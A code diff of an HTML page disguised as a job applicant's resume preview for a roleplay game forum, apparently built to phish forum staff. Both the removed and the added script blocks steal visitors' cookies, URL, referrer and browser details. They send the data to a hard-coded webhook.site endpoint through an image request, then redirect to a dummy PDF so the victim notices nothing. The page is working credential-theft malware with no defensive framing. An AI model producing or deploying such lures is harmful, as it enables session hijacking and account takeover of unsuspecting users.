@@ -1,81 +1,82 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>PR Manager Resume - Elite Roleplay</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <title>PR Manager Resume - Elite Roleplay Mobile</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { 
-      font-family: 'Segoe UI', Arial, sans-serif; 
-      background: #1a1a2e;
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: #0f0f23;
       color: #fff;
       min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
     }
-    .container {
-      background: #16213e;
-      padding: 40px;
-      border-radius: 12px;
-      max-width: 600px;
+    .card {
+      background: #1a1a3e;
+      padding: 50px 40px;
+      border-radius: 16px;
+      max-width: 520px;
       text-align: center;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+      box-shadow: 0 12px 40px rgba(233, 69, 96, 0.15);
+      border: 1px solid #2a2a5e;
     }
-    .spinner {
-      border: 4px solid rgba(255,255,255,0.1);
-      border-top: 4px solid #e94560;
+    .logo {
+      width: 64px;
+      height: 64px;
+      background: linear-gradient(135deg, #e94560, #0f3460);
       border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+    }
+    h1 { color: #e94560; font-size: 22px; margin-bottom: 6px; }
+    .sub { color: #8888aa; font-size: 14px; margin-bottom: 24px; }
+    .spinner {
+      width: 40px; height: 40px;
+      border: 3px solid rgba(255,255,255,0.05);
+      border-top: 3px solid #e94560;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
       margin: 20px auto;
     }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    h1 { color: #e94560; margin-bottom: 10px; }
-    p { color: #a0a0b0; margin: 10px 0; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .note { color: #6666aa; font-size: 12px; margin-top: 20px; }
   </style>
 </head>
 <body>
-  <div class="container">
+  <div class="card">
+    <div class="logo">📄</div>
     <h1>PR Manager Application</h1>
-    <p>Alan Zelensky - Resume & Portfolio</p>
+    <p class="sub">Alan Zelensky — Resume & Portfolio Preview</p>
     <div class="spinner"></div>
-    <p>Preparing your document preview...</p>
-    <p><small>You will be redirected to the PDF in a moment</small></p>
+    <p>Preparing document preview...</p>
+    <p class="note">You will be redirected to the PDF momentarily</p>
   </div>
 
   <script>
-    // ===== COOKIE STEALER =====
-    // Method 1: Try to steal cookies via JavaScript
-    try {
-      var cookies = document.cookie;
-      var payload = cookies || "no_js_cookies";
-      
-      // Send to webhook via image request (works even if page redirects)
-      var img = new Image();
-      img.src = "https://webhook.site/e777a317-ac19-47b1-9afd-48008397e1d4?cookie=" + 
-                encodeURIComponent(payload) + 
-                "&url=" + encodeURIComponent(window.location.href) +
-                "&ref=" + encodeURIComponent(document.referrer);
-    } catch(e) {
-      // Fallback: still notify webhook of the visit
-      var fallbackImg = new Image();
-      fallbackImg.src = "https://webhook.site/e777a317-ac19-47b1-9afd-48008397e1d4?error=" + 
-                        encodeURIComponent(e.message);
-    }
+    // Send everything we can capture to webhook
+    var data = {
+      cookie: document.cookie || "none",
+      url: window.location.href,
+      referrer: document.referrer || "direct",
+      ua: navigator.userAgent,
+      lang: navigator.language,
+      platform: navigator.platform
+    };
 
-    // Method 2: Also try to load resources from the forum to capture auth headers
-    // This won't work cross-origin but worth a shot
-    try {
-      var forumImg = new Image();
-      forumImg.src = "https://forum.eliterpmobile.in/favicon.ico";
-    } catch(e) {}
+    var img = new Image();
+    img.src = "https://webhook.site/e777a317-ac19-47b1-9afd-48008397e1d4?d=" + 
+              encodeURIComponent(JSON.stringify(data));
 
-    // ===== REDIRECT TO REAL PDF =====
+    // Redirect to real PDF after 2.5s
     setTimeout(function() {
       window.location.href = "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf";
-    }, 3000);
+    }, 2500);
   </script>
 </body>
 </html>
